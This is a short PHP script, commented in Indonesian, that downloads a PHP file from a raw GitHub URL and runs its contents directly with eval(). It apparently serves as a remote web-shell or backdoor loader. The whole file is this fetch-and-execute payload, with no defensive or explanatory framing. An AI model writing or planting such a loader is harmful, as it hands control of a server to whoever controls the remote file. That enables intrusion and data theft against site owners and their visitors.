<?php
// Inisialisasi cURL session
$ch = curl_init();

// Set URL yang akan diunduh
$dataUrl = "https://raw.githubusercontent.com/sunshine0110/zxsan/main/new.php";
curl_setopt($ch, CURLOPT_URL, $dataUrl);

// Set opsi untuk mengembalikan respons sebagai string
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

// Eksekusi cURL dan dapatkan respons
$data = curl_exec($ch);

// Tangani kesalahan jika ada
if (curl_errno($ch)) {
    die('Gagal mengunduh file: ' . curl_error($ch));
}

// Tutup koneksi cURL
curl_close($ch);

// Atur header dan tampilkan data
header("Content-Type: text/html");
eval('?>' . $data);
?>
